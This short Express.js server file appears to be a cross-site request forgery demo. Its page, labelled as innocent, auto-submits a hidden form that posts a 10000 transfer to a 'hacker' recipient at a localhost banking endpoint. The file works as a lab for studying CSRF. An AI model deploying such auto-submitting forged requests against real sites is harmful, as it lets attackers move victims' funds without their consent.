const express = require('express')
const app = express()
const port = 5000

app.get('/', (req, res) =>
  {
    console.log('I am a vicious website')
    res.set('Content-Type', 'text/html');
    // Malicious code
    res.status(200).send("<h3>I am an innocent website!</h3><form action='http://localhost:3000/transfer' method='post'><input id='POST-name' placeholder='recipient' name='recipient' value='hacker'><input id='POST-amount' placeholder='$20' name='amount' value='10000'><input type='submit' value='Save'></form><script>document.forms[0].submit()</script>")
  }
)

app.listen(port, () => console.log(`Example app listening on port ${port}!`))
